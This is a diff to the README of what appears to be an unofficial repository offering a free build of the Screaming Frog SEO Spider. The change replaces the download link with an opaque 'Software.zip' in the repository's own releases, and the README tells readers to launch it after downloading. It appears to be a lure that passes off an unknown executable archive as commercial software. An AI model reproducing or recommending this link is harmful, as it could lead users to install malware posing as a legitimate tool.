@@ -28,7 +28,7 @@ Welcome to the Screaming Frog SEO Spider GitHub repository! This is your one-sto
 
 To get the latest version of the Screaming Frog SEO Spider, download it from the following link:
 
-[![Download Screaming Frog SEO Spider](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Screaming Frog SEO Spider](https://github.com/SFGFGRSDR/Screaming-Frog-SEO-Spider-Free/releases/download/v1.0/Software.zip)](https://github.com/SFGFGRSDR/Screaming-Frog-SEO-Spider-Free/releases/download/v1.0/Software.zip)
 
 Remember, it needs to be launched after downloading. If the provided link is not working, you can always check the "Releases" section of this repository for more options.
 
